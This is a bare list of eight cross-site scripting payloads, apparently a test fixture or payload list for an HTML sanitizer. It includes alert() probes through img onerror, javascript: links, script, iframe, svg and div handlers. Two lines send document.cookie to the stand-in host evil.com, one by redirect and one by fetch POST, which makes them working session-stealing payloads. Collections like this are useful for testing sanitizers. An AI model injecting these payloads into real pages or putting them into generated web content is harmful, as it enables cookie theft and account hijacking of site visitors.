<img src="" onerror="alert('XSS via img onerror')">

<img src="x" onerror="window.location='http://evil.com/steal?cookie='+document.cookie">

<a href="javascript:alert('XSS via javascript href')">click me</a>

<script>alert('direct script injection')</script>

<iframe src="javascript:alert('XSS via iframe')"></iframe>

<svg onload="alert('XSS via SVG onload')">

<div onclick="alert('XSS via div onclick')">click</div>

<img src="x" onload="fetch('http://evil.com/steal', {method:'POST', body:document.cookie})">